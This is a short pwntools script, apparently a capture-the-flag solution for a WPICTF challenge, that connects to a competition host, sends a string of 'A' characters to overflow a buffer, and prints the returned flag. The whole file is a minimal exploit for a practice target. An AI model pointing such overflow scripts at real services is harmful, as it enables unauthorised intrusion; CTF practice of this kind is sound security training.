from pwn import *

host , port = "smash184384.wpictf.xyz" , 15724

 
s = remote(host,port, level = 'debug')

r = s.recv(1024)

print(r)

s.sendline('AAAAAAAAAAAAAAAAAAA')

flag= s.recvline()

print(flag)
